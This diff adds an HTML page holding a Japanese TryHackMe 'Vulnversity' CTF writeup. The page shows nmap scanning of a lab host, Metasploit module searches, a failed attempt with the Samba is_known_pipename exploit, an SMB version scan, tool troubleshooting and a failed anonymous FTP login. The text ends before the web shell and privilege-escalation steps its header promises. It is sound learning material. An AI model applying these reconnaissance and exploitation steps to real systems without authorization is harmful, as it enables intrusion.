@@ -1,0 +1,1083 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Vulnversity Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Vulnversity</h1>
+    <p>多サービス列挙（FTP/Samba/Squid）、Web シェル、systemd 権限昇格。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p>```bash                                                                                                                                         ┌──(rkametani㉿rkametani-1-kalija)-[~]<br>
+└─$ nmap 10.48.179.41 -sV<br>
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 10:02 +0900<br>
+Nmap scan report for 10.48.179.41<br>
+Host is up (0.13s latency).<br>
+Not shown: 994 closed tcp ports (reset)<br>
+PORT     STATE SERVICE     VERSION<br>
+21/tcp   open  ftp         vsftpd 3.0.5<br>
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)<br>
+139/tcp  open  netbios-ssn Samba smbd 4<br>
+445/tcp  open  netbios-ssn Samba smbd 4<br>
+3128/tcp open  http-proxy  Squid http proxy 4.10<br>
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))<br>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+Nmap done: 1 IP address (1 host up) scanned in 25.74 seconds</p>
+<p>┌──(rkametani㉿rkametani-1-kalija)-[~]</p>
+<pre><code>nmapを実施した
+
+```bash
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ msfconsole -q        
+msf &gt; 
+</code></pre>
+<p>msfconsoleを起動した</p>
+<pre><code class="language-bash">msf &gt; search vsftpd 3
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf &gt; search openssh 8.2
+[-] No results from search
+</code></pre>
+<p>バージョン情報と照らし合わせながらモジュールを探す</p>
+<pre><code class="language-bash">msf &gt; search samba 4
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/citrix_access_gateway_exec               2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   1   exploit/windows/license/calicclnt_getconfig                  2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
+   2     \_ target: Automatic                                       .                .          .      .
+   3     \_ target: Windows 2000 English                            .                .          .      .
+   4     \_ target: Windows XP English SP0-1                        .                .          .      .
+   5     \_ target: Windows XP English SP2                          .                .          .      .
+   6     \_ target: Windows 2003 English SP0                        .                .          .      .
+   7   exploit/unix/misc/distcc_exec                                2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   8   exploit/windows/smb/group_policy_startup                     2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   9     \_ target: Windows x86                                     .                .          .      .
+   10    \_ target: Windows x64                                     .                .          .      .
+   11  exploit/windows/fileformat/ms14_060_sandworm                 2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   12  exploit/unix/http/quest_kace_systems_management_rce          2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   13  exploit/multi/samba/usermap_script                           2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution
+   14  exploit/multi/samba/nttrans                                  2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   15  exploit/linux/samba/setinfopolicy_heap                       2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   16    \_ target: 2:3.5.11~dfsg-1ubuntu2 on Ubuntu Server 11.10   .                .          .      .
+   17    \_ target: 2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.10    .                .          .      .
+   18    \_ target: 2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.04    .                .          .      .
+   19    \_ target: 2:3.5.4~dfsg-1ubuntu8 on Ubuntu Server 10.10    .                .          .      .
+   20    \_ target: 2:3.5.6~dfsg-3squeeze6 on Debian Squeeze        .                .          .      .
+   21    \_ target: 3.5.10-0.107.el5 on CentOS 5                    .                .          .      .
+   22  auxiliary/admin/smb/samba_symlink_traversal                  .                normal     No     Samba Symlink Directory Traversal
+   23  auxiliary/scanner/smb/smb_uninit_cred                        .                normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   24  exploit/linux/samba/chain_reply                              2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   25    \_ target: Linux (Debian5 3.2.5-4lenny6)                   .                .          .      .
+   26    \_ target: Debugging Target                                .                .          .      .
+   27  exploit/linux/samba/is_known_pipename                        2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   28    \_ target: Automatic (Interact)                            .                .          .      .
+   29    \_ target: Automatic (Command)                             .                .          .      .
+   30    \_ target: Linux x86                                       .                .          .      .
+   31    \_ target: Linux x86_64                                    .                .          .      .
+   32    \_ target: Linux ARM (LE)                                  .                .          .      .
+   33    \_ target: Linux ARM64                                     .                .          .      .
+   34    \_ target: Linux MIPS                                      .                .          .      .
+   35    \_ target: Linux MIPSLE                                    .                .          .      .
+   36    \_ target: Linux MIPS64                                    .                .          .      .
+   37    \_ target: Linux MIPS64LE                                  .                .          .      .
+   38    \_ target: Linux PPC                                       .                .          .      .
+   39    \_ target: Linux PPC64                                     .                .          .      .
+   40    \_ target: Linux PPC64 (LE)                                .                .          .      .
+   41    \_ target: Linux SPARC                                     .                .          .      .
+   42    \_ target: Linux SPARC64                                   .                .          .      .
+   43    \_ target: Linux s390x                                     .                .          .      .
+   44  auxiliary/dos/samba/lsa_addprivs_heap                        .                normal     No     Samba lsa_io_privilege_set Heap Overflow
+   45  auxiliary/dos/samba/lsa_transnames_heap                      .                normal     No     Samba lsa_io_trans_names Heap Overflow
+   46  exploit/linux/samba/lsa_transnames_heap                      2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   47    \_ target: Linux vsyscall                                  .                .          .      .
+   48    \_ target: Linux Heap Brute Force (Debian/Ubuntu)          .                .          .      .
+   49    \_ target: Linux Heap Brute Force (Gentoo)                 .                .          .      .
+   50    \_ target: Linux Heap Brute Force (Mandriva)               .                .          .      .
+   51    \_ target: Linux Heap Brute Force (RHEL/CentOS)            .                .          .      .
+   52    \_ target: Linux Heap Brute Force (SUSE)                   .                .          .      .
+   53    \_ target: Linux Heap Brute Force (Slackware)              .                .          .      .
+   54    \_ target: Linux Heap Brute Force (OpenWRT MIPS)           .                .          .      .
+   55    \_ target: DEBUG                                           .                .          .      .
+   56  exploit/osx/samba/lsa_transnames_heap                        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   57    \_ target: Automatic                                       .                .          .      .
+   58    \_ target: Mac OS X 10.4.x x86 Samba 3.0.10                .                .          .      .
+   59    \_ target: Mac OS X 10.4.x PPC Samba 3.0.10                .                .          .      .
+   60    \_ target: DEBUG                                           .                .          .      .
+   61  exploit/solaris/samba/lsa_transnames_heap                    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   62    \_ target: Solaris 8/9/10 x86 Samba 3.0.21-3.0.24          .                .          .      .
+   63    \_ target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24        .                .          .      .
+   64    \_ target: DEBUG                                           .                .          .      .
+   65  auxiliary/dos/samba/read_nttrans_ea_list                     .                normal     No     Samba read_nttrans_ea_list Integer Overflow
+   66  exploit/freebsd/samba/trans2open                             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
+   67  exploit/linux/samba/trans2open                               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
+   68  exploit/osx/samba/trans2open                                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
+   69  exploit/solaris/samba/trans2open                             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
+   70    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .          .      .
+   71    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .          .      .
+   72  exploit/windows/http/sambar6_search_results                  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
+   73    \_ target: Automatic                                       .                .          .      .
+   74    \_ target: Windows 2000                                    .                .          .      .
+   75    \_ target: Windows XP                                      .                .          .      .
+
+
+Interact with a module by name or index. For example info 75, use 75 or use exploit/windows/http/sambar6_search_results
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows XP'
+
+msf &gt;
+</code></pre>
+<p>ここで<code>search samba 4</code>という検索を実行したが出力結果が多すぎるため困った</p>
+<pre><code class="language-bash">msf &gt; search samba rank:excellent
+
+Matching Modules
+================
+
+   #   Name                                                 Disclosure Date  Rank       Check  Description
+   -   ----                                                 ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   1   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   2   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   3   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   4   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution
+   5   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   6     \_ target: Automatic (Interact)                    .                .          .      .
+   7     \_ target: Automatic (Command)                     .                .          .      .
+   8     \_ target: Linux x86                               .                .          .      .
+   9     \_ target: Linux x86_64                            .                .          .      .
+   10    \_ target: Linux ARM (LE)                          .                .          .      .
+   11    \_ target: Linux ARM64                             .                .          .      .
+   12    \_ target: Linux MIPS                              .                .          .      .
+   13    \_ target: Linux MIPSLE                            .                .          .      .
+   14    \_ target: Linux MIPS64                            .                .          .      .
+   15    \_ target: Linux MIPS64LE                          .                .          .      .
+   16    \_ target: Linux PPC                               .                .          .      .
+   17    \_ target: Linux PPC64                             .                .          .      .
+   18    \_ target: Linux PPC64 (LE)                        .                .          .      .
+   19    \_ target: Linux SPARC                             .                .          .      .
+   20    \_ target: Linux SPARC64                           .                .          .      .
+   21    \_ target: Linux s390x                             .                .          .      .
+
+
+Interact with a module by name or index. For example info 21, use 21 or use exploit/linux/samba/is_known_pipename
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux s390x'
+
+msf &gt; 
+</code></pre>
+<p>そこでmoduleのrankuをexcellentに絞って再度検索をかけた</p>
+<pre><code class="language-bash">msf &gt; info exploit/unix/webapp/citrix_access_gateway_exec 
+[-] Error while running command info: uninitialized constant HTTP
+
+Call stack:
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/http-cookie-1.1.4/lib/http/cookie_jar/hash_store.rb:3:in `&lt;top (required)&gt;'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `require'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `block (2 levels) in replace_require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap-1.23.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/zeitwerk-2.7.5/lib/zeitwerk/core_ext/kernel.rb:34:in `require'
+/usr/share/metasploit-framework/lib/msf/core/exploit/remote/http/http_cookie_jar.rb:2:in `&lt;top (required)&gt;'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `require'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `block (2 levels) in replace_require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap-1.23.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/zeitwerk-2.7.5/lib/zeitwerk/core_ext/kernel.rb:26:in `require'
+/usr/share/metasploit-framework/lib/msf/core/exploit/remote/http_client.rb:99:in `initialize'
+/usr/share/metasploit-framework/modules/exploits/unix/webapp/citrix_access_gateway_exec.rb:12:in `initialize'
+/usr/share/metasploit-framework/lib/msf/core/module_set.rb:37:in `new'
+/usr/share/metasploit-framework/lib/msf/core/module_set.rb:37:in `create'
+/usr/share/metasploit-framework/lib/msf/core/module_manager.rb:74:in `create'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:208:in `block in cmd_info'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:189:in `each'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:189:in `cmd_info'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+/usr/bin/msfconsole:23:in `&lt;main&gt;'
+msf &gt; 
+</code></pre>
+<p>1つのモジュールについての情報を取ろうとしたところエラーが発生した<br>
+再起動やデータベースの初期化を実施する</p>
+<pre><code class="language-bash">msf &gt; exit
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ msfdb reinit 
+[-] Error: /usr/bin/msfdb must be run as root
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ sudo msfdb reinit  
+[sudo] rkametani のパスワード:
+[+] Starting database
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Creating database user 'msf'
+新しいロールのためのパスワード: 
+もう一度入力してください：
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ sudo apt update    
+取得:1 https://cli.github.com/packages stable InRelease [3,917 B]
+ヒット:2 https://dl.google.com/linux/chrome-stable/deb stable InRelease                                  
+ヒット:3 https://ftp.jaist.ac.jp/pub/Linux/kali kali-rolling InRelease                   
+3,917 B を 1秒 で取得しました (4,319 B/s)
+アップグレードできるパッケージが 15 個あります。表示するには 'apt list --upgradable' を実行してください。
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ sudo apt upgrade -y
+以下のパッケージが自動でインストールされましたが、もう必要とされていません:
+  libicu76  libsimdutf29
+これを削除するには 'sudo apt autoremove' を利用してください。
+
+Not upgrading:
+  gstreamer1.0-plugins-bad       libgtk-4-1      libmagickcore-7.q16-10-extra  libpipewire-0.3-modules  pipewire
+  libadwaita-1-0                 libgtk-4-bin    libonnxruntime-providers      libspa-0.2-bluetooth     pipewire-bin
+  libgstreamer-plugins-bad1.0-0  libgtkmm-4.0-0  libpipewire-0.3-0t64          libspa-0.2-modules       pipewire-pulse
+
+Summary:
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 15
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ sudo apt autoremove
+REMOVING:                                                   
+  libicu76  libsimdutf29
+
+Summary:
+  Upgrading: 0, Installing: 0, Removing: 2, Not Upgrading: 15
+  Freed space: 38.9 MB
+
+Continue? [Y/n] y
+(データベースを読み込んでいます ... 現在 410520 個のファイルとディレクトリがインストールされています。)
+libicu76:amd64 (76.1-4+b1) を削除しています ...
+libsimdutf29:amd64 (7.7.1-3) を削除しています ...
+libc-bin (2.42-13) のトリガを処理しています ...
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ sudo apt install metasploit-framework
+metasploit-framework はすでに最新バージョン (6.4.126-0kali1) です。
+metasploit-framework は手動でインストールしたと設定されました。
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 15
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ msfconsole -q
+msf &gt; 
+</code></pre>
+<p>再インストールなども含めて実施した</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ msfconsole -q
+msf &gt; info exploit/unix/webapp/citrix_access_gateway_exec 
+[-] Error while running command info: uninitialized constant HTTP
+
+Call stack:
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/http-cookie-1.1.4/lib/http/cookie_jar/hash_store.rb:3:in `&lt;top (required)&gt;'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `require'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `block (2 levels) in replace_require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap-1.23.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/zeitwerk-2.7.5/lib/zeitwerk/core_ext/kernel.rb:34:in `require'
+/usr/share/metasploit-framework/lib/msf/core/exploit/remote/http/http_cookie_jar.rb:2:in `&lt;top (required)&gt;'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `require'
+/usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `block (2 levels) in replace_require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap-1.23.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require'
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/zeitwerk-2.7.5/lib/zeitwerk/core_ext/kernel.rb:26:in `require'
+/usr/share/metasploit-framework/lib/msf/core/exploit/remote/http_client.rb:99:in `initialize'
+/usr/share/metasploit-framework/modules/exploits/unix/webapp/citrix_access_gateway_exec.rb:12:in `initialize'
+/usr/share/metasploit-framework/lib/msf/core/module_set.rb:37:in `new'
+/usr/share/metasploit-framework/lib/msf/core/module_set.rb:37:in `create'
+/usr/share/metasploit-framework/lib/msf/core/module_manager.rb:74:in `create'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:208:in `block in cmd_info'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:189:in `each'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:189:in `cmd_info'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+/usr/bin/msfconsole:23:in `&lt;main&gt;'
+msf &gt; 
+</code></pre>
+<p>再度infoを取ろうとしたが同様のエラーが出た</p>
+<pre><code class="language-bash">msf &gt; search samba 4 rank:excellent
+
+Matching Modules
+================
+
+   #   Name                                                 Disclosure Date  Rank       Check  Description
+   -   ----                                                 ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   1   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   2   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   3   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   4   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution
+   5   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   6     \_ target: Automatic (Interact)                    .                .          .      .
+   7     \_ target: Automatic (Command)                     .                .          .      .
+   8     \_ target: Linux x86                               .                .          .      .
+   9     \_ target: Linux x86_64                            .                .          .      .
+   10    \_ target: Linux ARM (LE)                          .                .          .      .
+   11    \_ target: Linux ARM64                             .                .          .      .
+   12    \_ target: Linux MIPS                              .                .          .      .
+   13    \_ target: Linux MIPSLE                            .                .          .      .
+   14    \_ target: Linux MIPS64                            .                .          .      .
+   15    \_ target: Linux MIPS64LE                          .                .          .      .
+   16    \_ target: Linux PPC                               .                .          .      .
+   17    \_ target: Linux PPC64                             .                .          .      .
+   18    \_ target: Linux PPC64 (LE)                        .                .          .      .
+   19    \_ target: Linux SPARC                             .                .          .      .
+   20    \_ target: Linux SPARC64                           .                .          .      .
+   21    \_ target: Linux s390x                             .                .          .      .
+
+
+Interact with a module by name or index. For example info 21, use 21 or use exploit/linux/samba/is_known_pipename
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux s390x'
+
+msf &gt;
+</code></pre>
+<p>改めてsearchの結果を見直すと<br>
+5行目のis_known_pipenameはさまざまなtargetに対応しており<br>
+また日付も比較的新しいため調べる優先度が高いものと思える</p>
+<pre><code class="language-bash">msf &gt; info 5
+
+       Name: Samba is_known_pipename() Arbitrary Module Load
+     Module: exploit/linux/samba/is_known_pipename
+   Platform: Linux, Unix
+       Arch: cmd, x86, x64, armle, aarch64, mips, mipsle, mips64, mips64le, ppc, ppc64, ppc64le, sparc, sparc64, zarch
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2017-03-24
+
+Provided by:
+  steelo &lt;knownsteelo@gmail.com&gt;
+  hdm &lt;x@hdm.io&gt;
+  bcoles &lt;bcoles@gmail.com&gt;
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic (Interact)
+      1   Automatic (Command)
+      2   Linux x86
+      3   Linux x86_64
+      4   Linux ARM (LE)
+      5   Linux ARM64
+      6   Linux MIPS
+      7   Linux MIPSLE
+      8   Linux MIPS64
+      9   Linux MIPS64LE
+      10  Linux PPC
+      11  Linux PPC64
+      12  Linux PPC64 (LE)
+      13  Linux SPARC
+      14  Linux SPARC64
+      15  Linux s390x
+
+Check supported:
+  Yes
+
+Basic options:
+  Name            Current Setting  Required  Description
+  ----            ---------------  --------  -----------
+  RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
+                                             sploit.html
+  RPORT           445              yes       The SMB service port (TCP)
+  SMB_FOLDER                       no        The directory to use within the writeable SMB share
+  SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+Payload information:
+  Space: 9000
+
+Description:
+  This module triggers an arbitrary shared library load vulnerability
+  in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module
+  requires valid credentials, a writeable folder in an accessible share,
+  and knowledge of the server-side path of the writeable folder. In
+  some cases, anonymous access combined with common filesystem locations
+  can be used to automatically exploit this vulnerability.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2017-7494
+  https://www.samba.org/samba/security/CVE-2017-7494.html
+  https://attack.mitre.org/techniques/T1083/
+  https://attack.mitre.org/techniques/T1135/
+  https://attack.mitre.org/techniques/T1592/002/
+  https://attack.mitre.org/techniques/T1055/001/
+
+
+View the full module info with the info -d command.
+
+msf &gt; 
+
+</code></pre>
+<p>そこで<code>info 5</code>を実行したところエラーなしの情報を得られた<br>
+descriptionによるといくつかのsambaのバージョンに対応しており<br>
+共有フォルダに関する攻撃をできるようであった</p>
+<pre><code class="language-bash">msf exploit(linux/samba/is_known_pipename) &gt; show options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   RHOSTS          10.48.179.41     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
+                                              asploit.html
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Interact)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/is_known_pipename) &gt; run
+[-] 10.48.179.41:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server uses an unsupported SMB dialect
+[*] Exploit completed, but no session was created.
+msf exploit(linux/samba/is_known_pipename) &gt; 
+
+</code></pre>
+<p>失敗した</p>
+<p>余談であるがmetasploitからsmbのバージョンが取れた。便利だね。</p>
+<pre><code class="language-bash">msf &gt; use auxiliary/scanner/smb/smb_version 
+msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.48.149.41
+RHOSTS =&gt; 10.48.149.41
+msf auxiliary(scanner/smb/smb_version) &gt; run
+^C[*] 10.48.149.41          - Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_version) &gt; set RHOST 10.48.179.41
+RHOST =&gt; 10.48.179.41
+msf auxiliary(scanner/smb/smb_version) &gt; run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 10.48.179.41:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{312d7069-2d30-3834-2d31-37392d343100}) (authentication domain:IP-10-48-179-41)
+[+] 10.48.179.41:445      -   Host is running Version 6.1.0 (unknown OS)
+[*] 10.48.179.41          - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_version) &gt;
+</code></pre>
+<p>少し迷子になってきたので再度nmapの結果に戻る</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.48.179.41 -sV
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 10:59 +0900
+Nmap scan report for 10.48.179.41
+Host is up (0.13s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.70 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+
+</code></pre>
+<p>3128番ポートと3333番ポートのサービスについてmoduleがないか探してみる</p>
+<pre><code class="language-bash">msf &gt; search proxy 4.10
+[-] No results from search
+msf &gt; search apache 2.4.41
+[-] No results from search
+msf &gt;
+</code></pre>
+<p>バージョンにぴったりのモジュールは見つからず。</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ ftp 10.48.179.41
+Connected to 10.48.179.41.
+220 (vsFTPd 3.0.5)
+Name (10.48.179.41:rkametani): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp&gt; ftp
+Already connected to 10.48.179.41, use close first.
+ftp&gt; ls
+530 Please login with USER and PASS.
+530 Please login with USER and PASS.
